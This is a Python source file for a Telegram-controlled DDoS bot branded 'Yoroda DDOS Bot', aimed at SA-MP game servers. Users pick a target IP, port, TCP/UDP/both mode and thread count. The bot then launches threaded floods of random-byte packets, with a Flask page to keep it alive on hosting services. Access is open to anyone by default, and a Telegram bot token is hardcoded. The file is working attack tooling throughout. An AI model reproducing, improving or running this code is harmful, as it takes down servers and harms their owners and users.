import os
import random
import socket
import threading
import time
import sys
import telebot
from flask import Flask, jsonify
import warnings

# ============================================================
# FLASK WEB SERVER FOR UPTIME ROBOT
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Yoroda DDOS Bot</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #0a0a0a; color: #ff4444; }
                h1 { color: #ff4444; text-shadow: 0 0 10px #ff4444; }
                .status { font-size: 24px; margin: 20px 0; }
                .green { color: #00ff00; }
                .info { color: #ffffff; font-size: 16px; }
                .container { background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #ff4444; max-width: 600px; margin: 0 auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔥 YORODA DDOS BOT</h1>
                <div class="status green">✅ Bot is RUNNING</div>
                <div class="info">⚡ Mode: DDOS (SA-MP)</div>
                <div class="info">👤 Operator: Yoroda Hamada</div>
                <div class="info" style="margin-top:20px;font-size:14px;color:#888;">
                    Uptime Robot Monitor Active
                </div>
            </div>
        </body>
    </html>
    """

@flask_app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "bot": "running",
        "mode": "DDOS",
        "timestamp": time.time()
    })

@flask_app.route('/status')
def status():
    active_attacks = sum(1 for v in attack_running.values() if v)
    return jsonify({
        "status": "running",
        "active_attacks": active_attacks,
        "total_threads": threading.active_count()
    })

def run_web_server():
    """Run Flask web server for Uptime Robot"""
    port = int(os.environ.get('PORT', 10000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ============================================================
# TELEGRAM BOT
# ============================================================

# PALITAN ITO NG BAGONG TOKEN MO
BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
bot = telebot.TeleBot(BOT_TOKEN)

# Global variables
user_data = {}
attack_threads = {}
attack_running = {}

AUTHORIZED_USERS = []  # Add your Telegram user ID here

def is_authorized(user_id):
    if not AUTHORIZED_USERS:
        return True
    return user_id in AUTHORIZED_USERS

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized.")
        return
    
    welcome_text = """🔥 YORODA HAMADA 🔥

Security / Network Tool
Mode: DDOS (SA-MP)
Operator: Yoroda Hamada

Commands:
/attack - Start attack
/stop - Stop attack
/status - Check status
/help - Help menu"""
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def send_help(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized.")
        return
    
    help_text = """📖 How to use:
1. /attack
2. Enter IP
3. Enter port
4. Choose tcp/udp/both
5. Enter thread count

⚡ Commands:
/attack - New attack
/stop - Stop attack
/status - Check status"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def start_attack(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized.")
        return
    
    user_id = message.from_user.id
    
    if user_id in attack_running and attack_running[user_id]:
        bot.reply_to(message, "⚠️ Attack already running! Use /stop")
        return
    
    user_data[user_id] = {}
    user_data[user_id]['step'] = 'ip'
    
    bot.reply_to(message, "🎯 Enter target IP/Host:")

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        bot.reply_to(message, "Not authorized.")
        return
    
    if user_id not in user_data:
        return
    
    step = user_data[user_id].get('step')
    
    if step == 'ip':
        user_data[user_id]['ip'] = message.text.strip()
        user_data[user_id]['step'] = 'port'
        bot.reply_to(message, f"✅ IP: {user_data[user_id]['ip']}\n📡 Enter port:")
    
    elif step == 'port':
        try:
            port = int(message.text.strip())
            user_data[user_id]['port'] = port
            user_data[user_id]['step'] = 'attack_type'
            bot.reply_to(message, f"✅ Port: {port}\n⚡ Choose attack type:\ntcp / udp / both")
        except ValueError:
            bot.reply_to(message, "❌ Invalid port. Enter number:")
    
    elif step == 'attack_type':
        attack_type = message.text.strip().lower()
        if attack_type in ['tcp', 'udp', 'both']:
            user_data[user_id]['attack_type'] = attack_type
            user_data[user_id]['step'] = 'threads'
            bot.reply_to(message, f"✅ Attack: {attack_type.upper()}\n🧵 Enter thread count (100-5000):")
        else:
            bot.reply_to(message, "❌ Invalid. Choose tcp/udp/both:")
    
    elif step == 'threads':
        try:
            threads = int(message.text.strip())
            if threads < 1:
                bot.reply_to(message, "❌ Must be > 0")
                return
            user_data[user_id]['threads'] = threads
            user_data[user_id]['step'] = 'confirm'
            
            summary = f"""📋 CONFIGURATION
━━━━━━━━━━━━━━━━
🎯 IP: {user_data[user_id]['ip']}
📡 Port: {user_data[user_id]['port']}
⚡ Type: {user_data[user_id]['attack_type'].upper()}
🧵 Threads: {threads}
━━━━━━━━━━━━━━━━

🚀 Start attack? (y/n)"""
            bot.reply_to(message, summary)
            
        except ValueError:
            bot.reply_to(message, "❌ Invalid number:")
    
    elif step == 'confirm':
        if message.text.strip().lower() == 'y':
            ip = user_data[user_id]['ip']
            port = user_data[user_id]['port']
            attack_type = user_data[user_id]['attack_type']
            threads = user_data[user_id]['threads']
            
            attack_running[user_id] = True
            
            bot.reply_to(message, f"""🔥 ATTACK STARTED!
━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⚡ Type: {attack_type.upper()}
🧵 Threads: {threads}
📊 Status: RUNNING
━━━━━━━━━━━━━━━━""")
            
            start_attack_threads(user_id, ip, port, attack_type, threads)
            
        else:
            bot.reply_to(message, "❌ Cancelled.")
            del user_data[user_id]

def start_attack_threads(user_id, ip, port, attack_type, threads):
    def udp_attack():
        data = random._urandom(998)
        while attack_running.get(user_id, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                while attack_running.get(user_id, False):
                    s.sendto(data, addr)
            except:
                pass
            finally:
                try:
                    s.close()
                except:
                    pass
    
    def tcp_attack():
        data = random._urandom(871)
        while attack_running.get(user_id, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                while attack_running.get(user_id, False):
                    s.send(data)
                s.close()
            except:
                pass
            finally:
                try:
                    s.close()
                except:
                    pass
    
    attack_threads[user_id] = []
    
    if attack_type == 'udp':
        for _ in range(threads):
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)
    
    elif attack_type == 'tcp':
        for _ in range(threads):
            t = threading.Thread(target=tcp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)
    
    elif attack_type == 'both':
        for _ in range(threads // 2):
            t1 = threading.Thread(target=udp_attack)
            t1.daemon = True
            t1.start()
            attack_threads[user_id].append(t1)
            
            t2 = threading.Thread(target=tcp_attack)
            t2.daemon = True
            t2.start()
            attack_threads[user_id].append(t2)
        
        if threads % 2 != 0:
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Not authorized.")
        return
    
    user_id = message.from_user.id
    
    if user_id in attack_running and attack_running[user_id]:
        attack_running[user_id] = False
        attack_threads[user_id] = []
        bot.reply_to(message, "🛑 ATTACK STOPPED!")
    else:
        bot.reply_to(message, "❌ No active attack.")

@bot.message_handler(commands=['status'])
def check_status(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Not authorized.")
        return
    
    user_id = message.from_user.id
    is_running = attack_running.get(user_id, False)
    
    status_text = f"""📊 STATUS
━━━━━━━━━━━━━━━━
🤖 Bot: Online
🔥 Attack: {'RUNNING' if is_running else 'STOPPED'}
🧵 Threads: {threading.active_count()} active
━━━━━━━━━━━━━━━━"""
    bot.reply_to(message, status_text)

if __name__ == "__main__":
    print("""
    =================================
      YORODA DDOS BOT
    =================================
      Mode: DDOS (SA-MP)
      Status: RUNNING
      Operator: Yoroda Hamada
    =================================
    """)
    
    # Start Flask web server for Uptime Robot
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    print("✅ Web server started for Uptime Robot monitoring")
    print("🌐 Web server running on port " + os.environ.get('PORT', '10000'))
    
    print("🤖 Bot is running. Press Ctrl+C to stop.")
    print("⚡ Unlimited attack mode enabled!")
    print("⚡ Attack types: TCP, UDP, or BOTH")
    
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Error: {e}")
